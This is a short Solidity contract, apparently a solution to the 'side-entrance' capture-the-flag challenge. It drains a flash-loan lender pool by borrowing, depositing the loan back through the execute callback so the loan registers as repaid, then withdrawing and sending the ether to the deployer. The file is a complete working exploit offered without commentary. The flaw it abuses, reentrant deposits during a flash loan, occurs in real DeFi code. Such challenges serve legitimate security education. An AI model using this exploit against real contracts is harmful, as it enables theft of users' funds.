// SPDX-License-Identifier: Inherit

pragma solidity ^0.6.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool selp;
    address payable owner;

    constructor(address pool) public {
        selp = SideEntranceLenderPool(pool);
        owner = msg.sender;
    }

    function getLoan(uint amount) public {
        selp.flashLoan(amount);
    }

    function withdraw() public {
        selp.withdraw();
    }

    function execute() public payable {
        selp.deposit{ value: msg.value }();
    }

    receive() external payable {
        owner.transfer(msg.value);
    }
}